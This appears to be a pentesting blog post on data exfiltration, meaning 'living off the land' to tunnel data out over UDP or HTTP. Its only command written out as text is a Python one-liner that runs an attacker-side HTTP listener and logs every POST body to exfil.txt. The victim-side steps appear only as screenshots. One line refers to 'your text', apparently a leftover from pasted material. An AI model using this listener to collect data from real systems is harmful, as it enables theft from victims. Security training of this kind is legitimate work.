---
layout: post
title: "The Exfiltration Handbook"
date: 2026-01-24
categories: [pentesting]
image: https://miro.medium.com/v2/resize:fit:720/format:webp/1*nOvrIc-KReNi6cpEpPTOEQ.png
permalink: /blog/Data-Exfiltration
locked: false
---

In this guide, I’m breaking down how to "live off the land." We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.

### 1. The UDP Socket

This is almost identical to the method in your text, but it uses **UDP** instead of TCP. This is useful if the firewall blocks TCP connections but leaves UDP open (often for DNS or media traffic).

<div onclick="togglePerspective(this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a7G9SaEkrJfqFv4Y2N_FIQ.png" 
       data-label="Attacker (Listener)" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: block;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*J1uM1b5rD7dDmNAq_jamHg.png" 
       data-label="Victim (Sender)" 
       data-color="#ff5555" 
       data-align="right"
       style="width: 100%; display: none;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*k6y-TCqAW3ACofhnB74Fiw.png" 
       data-label="Attacker" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: none;">

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(container) {
  event.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

### HTTP Exfiltration

sending data as a web request is one of the stealthiest methods. You can use curl or wget, which are installed on most Linux servers.

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="python">
python3 -c '
from http.server import HTTPServer, BaseHTTPRequestHandler
class P(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        data = self.rfile.read(length).decode()
        with open("exfil.txt", "a") as f:
            f.write(data + "\n")
        print(f"[*] Data saved to exfil.txt")
        self.send_response(200)
        self.end_headers()
HTTPServer(("0.0.0.0", 80), P).serve_forever()
'
</code></pre>
  {% endraw %}
</div>

<div onclick="togglePerspective(this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9ufNbLj6UEi7dmE6F5owaQ.png" 
       data-label="Attacker (Listener)" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: block;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4BAW1QhjX07m7w7AFxuTkw.png" 
       data-label="Victim (Sender)" 
       data-color="#ff5555" 
       data-align="right"
       style="width: 100%; display: none;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*bIx8lsHh_Z4JXZY8qBSRiA.png" 
       data-label="Attacker" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: none;">

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(container) {
  event.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>